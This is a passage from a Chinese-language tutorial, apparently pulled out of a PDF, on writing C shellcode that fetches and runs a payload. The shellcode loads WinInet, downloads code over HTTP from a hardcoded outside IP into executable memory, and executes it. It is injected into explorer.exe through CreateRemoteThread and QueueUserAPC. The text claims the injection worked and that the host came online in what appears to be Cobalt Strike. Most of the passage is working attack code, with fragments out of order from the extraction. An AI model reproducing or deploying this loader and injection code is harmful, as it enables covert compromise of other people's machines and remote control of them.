  char InternetOpenA[15];
  char InternetConnectA[18];
  char HttpOpenRequestA[18];
  char HttpSendRequestA[18];
  char InternetReadFile[18];
  INTERNET_PORT port;
  char ip[15];
  char path[10];
  char ua[80];
}SHELLDATA, * PSHELLDATA;
// 对数据进⾏赋值
HMODULE  kernel32 = GetModuleHandleA("kernel32");
FARPROC  fnVirtualAlloc = 
GetProcAddress(kernel32,"VirtualAlloc");
FARPROC  fnLoadLibraryA = 
GetProcAddress(kernel32,"LoadLibraryA");
FARPROC  fnGetProcAddress = 
GetProcAddress(kernel32,"GetProcAddress");
SHELLDATA shelldata = {
  (pVirtualAlloc)fnVirtualAlloc,
  (pLoadLibraryA)fnLoadLibraryA,
  (pGetProcAddress)fnGetProcAddress,
  "wininet",
  "InternetOpenA",
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
接下来定义作为shellcode执⾏的函数：
  "InternetConnectA",
  "HttpOpenRequestA",
  "HttpSendRequestA",
  "InternetReadFile",
   80,
   "39.107.29.229",
   "/4v9z",
   "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; 
Windows NT 5.1; Trident/4.0)\r\n"
};
34
35
36
37
38
39
40
41
42
void shellcode(SHELLDATA * pfunc_start) {
  HMODULE wininet = pfunc_start-
>fnLoadLibraryA(pfunc_start->wininet);
  pInternetOpenA fnInternetOpenA = 
(pInternetOpenA)pfunc_start->fnGetProcAddress(wininet, 
pfunc_start->InternetOpenA);
  pInternetConnectA fnInternetConnectA = 
(pInternetConnectA)pfunc_start-
>fnGetProcAddress(wininet, pfunc_start-
>InternetConnectA);
  pHttpOpenRequestA fnHttpOpenRequestA = 
(pHttpOpenRequestA)pfunc_start-
>fnGetProcAddress(wininet, pfunc_start-
>HttpOpenRequestA);
  pHttpSendRequestA fnHttpSendRequestA = 
(pHttpSendRequestA)pfunc_start-
>fnGetProcAddress(wininet, pfunc_start-
>HttpSendRequestA);
1
2
3
4
5
6
7
  pInternetReadFile fnInternetReadFile = 
(pInternetReadFile)pfunc_start-
>fnGetProcAddress(wininet, pfunc_start-
>InternetReadFile);
  HINTERNET hin = fnInternetOpenA(NULL, NULL, NULL, 
NULL, NULL);
  HINTERNET session = fnInternetConnectA(hin, 
pfunc_start->ip, pfunc_start->port, NULL, NULL, 0x3, 0, 
0);
  HINTERNET req = fnHttpOpenRequestA(session, NULL, 
pfunc_start->path, NULL, NULL, NULL, 0x84400200, NULL);
  while (TRUE) {
    BOOL status = fnHttpSendRequestA(req, pfunc_start-
>ua, -1, NULL, 0);
    if (status) 
      break;
    SleepEx(1000,FALSE);
  }
  LPVOID addr =  pfunc_start->fnVirtualAlloc(0, 
0x400000, 0x1000, 0x40);
  DWORD size = 0;
  LPVOID lpbuff = addr;
  while (TRUE) {
    BOOL status = fnInternetReadFile(req, lpbuff, 
0x2000, &size);
    //printf("[*] size: %d \n", size);
    if (status && size < 0x2000) {
      break;
    }
    else {
      lpbuff = (LPVOID)((UINT64)lpbuff + size);
    }
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
最后再 main 函数中进⾏调⽤:
那这段代码要怎么才能像真正的shellcode⼀样，在其他进程的进程空间中执⾏呢？
我们参考shellcode注⼊相关的⽅法，https://github.com/knownsec/shellcodeloader
接下来只演示两种⽅式，分别是 CreateRemoteThread 以及 QueueUserAPC 。
CreateRemoteThread注⼊⽅法
使⽤ CreateRemoteThread 进⾏注⼊⾮常简单，看它的定义如下：
  }
  ((void(*)())addr)();
}
31
32
33
int WinMain(
  HINSTANCE hInstance,
  HINSTANCE hPrevInstance,
  LPSTR     lpCmdLine,
  int       nShowCmd
) {
  shellcode(&shelldata);
  return 0;
}
1
2
3
4
5
6
7
8
9
HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
);
1
2
3
4
5
6
7
8
9
线程函数其实是接受⼀个指针类型的参数 lpParameter ，我们只需要这个参数⾥保存 shel
ldata  的指针即可，另外不要忘记把 shelldata 写到⽬标进程中，代码示例如下：
可以看到代码已经注⼊并执⾏成功，cs上已经成功上线。
  DWORD pid = getPID("explorer.exe");
  HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 
FALSE, pid);
  SIZE_T remoteBuffer = (SIZE_T)VirtualAllocEx(process, 
NULL, 0x10000, (MEM_RESERVE | MEM_COMMIT), 
PAGE_EXECUTE_READWRITE);
  SIZE_T size = 0;
  WriteProcessMemory(process, (LPVOID)remoteBuffer, 
&shelldata, sizeof(shelldata), &size);
  WriteProcessMemory(process, (LPVOID)
(remoteBuffer+size), shellcode , (SIZE_T)shellcode_end - 
(SIZE_T)shellcode , NULL);
  CreateRemoteThread(process, NULL, 0, 
(LPTHREAD_START_ROUTINE)(remoteBuffer + size), 
(LPVOID)remoteBuffer, 0, NULL);
  CloseHandle(process);
1
2
3
4
5
6
7
8
9
QueueUserAPC注⼊⽅法
QueueUserAPC 进⾏注⼊的核⼼是如下代码：
HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, 
TRUE, threadId);
QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
1
2
我们向⽬标进程中写⼊的 apcRoutine 作为 PAPCFUNC 被调⽤，看⼀下 PAPCFUNC 的定义：
虽然这个函数也接受⼀个指针参数，但是这个参数的值是不受我们控制的，⽆法把相关的数
据传递给这个函数。不过这都不是什么难事，我们接下来⼀步步的来解决这个问题
⾸先这⾥要求 apcRoutine 是⼀个单参数的函数，但是如果我们提供⼀个有两个参数的函
数，这样肯定也是不会有问题的，但是问题是第⼆个参数并不会被 caller  初始化，如果
是 x86_64 ，那就是寄存区 rdx 不会被存储有效值。
那我们能不能在调⽤函数之前，⾃⼰初始化⼀下rdx，让rdx指向shelldata？具体要怎么做
呢，想⼀下内存布局
初始化rdx时，需要先获取当前的 rip来做⾃定位，在x64平台上获取rip可以直接⽤指令 lea r
dx,[rip] ,所以初始化rdx的汇编代码就是：
只要运⾏完这两条指令，rdx就指向了shelldata。那接下来 shellcode 函数就可以使⽤rdx作
为⾃⼰的第⼆个参数了，所以需要将shellcode的函数定义修改为：
然后写如下代码就可以实现APC注⼊：
lea rdx,[rip]
sub rdx,(0x7+sizeof(shelldata))
1
2
void shellcode(LPVOID param,SHELLDATA * pfunc_start);
1
DWORD pid = getPID("explorer.exe");
  HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 
FALSE, pid);
  SIZE_T remoteBuffer = (SIZE_T)VirtualAllocEx(process, 
NULL, 0x10000, (MEM_RESERVE | MEM_COMMIT), 
PAGE_EXECUTE_READWRITE);
  SIZE_T sum_size = 0;
  SIZE_T size = 0;
  WriteProcessMemory(process, (LPVOID)remoteBuffer, 
&shelldata, sizeof(shelldata), &size);
  sum_size += size;
  BYTE code[]= {
    0x48,0x8d,0x15,0x0,0x0,0x0,0x0,       // lea rdx,
[rip]
    0x48,0x81,0xea,0xf7,0x0,0x0,0x0,   // sub rdx, 
(0x7+sizeof( shelldata ))
    0x90,0x90                                 //nop
  };
  WriteProcessMemory(process, (LPVOID)(remoteBuffer + 
sum_size), code, sizeof(code), &size);
  sum_size += size;
1
2
3
4
5
6
7
8
9
10
11
12
13
14
看⼀看⼀下写⼊之后的代码如下：
  WriteProcessMemory(process, (LPVOID)(remoteBuffer+ 
sum_size), shellcode, (SIZE_T)shellcode_end - 
(SIZE_T)shellcode , NULL);
  THREADENTRY32 te32;
  te32.dwSize = sizeof(te32);
  HANDLE Snapshot_thread = 
CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
  if (Snapshot_thread != INVALID_HANDLE_VALUE)
  {
    if (Thread32First(Snapshot_thread, &te32))
    {
      do
      {
        if (te32.th32OwnerProcessID == pid)
        {
          //return te32.th32ThreadID;
          HANDLE threadHandle = 
OpenThread(THREAD_ALL_ACCESS, TRUE, te32.th32ThreadID);
          QueueUserAPC((PAPCFUNC)(remoteBuffer + 
sizeof(shelldata)), threadHandle, NULL);
        }
      } while (Thread32Next(Snapshot_thread, &te32));
    }
  }
  CloseHandle(Snapshot_thread);
  CloseHandle(process);
  Sleep(1000 * 60*30);
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
最后编译选项啥的不要忘记了，之前的⽂章讲过的，不再细说了。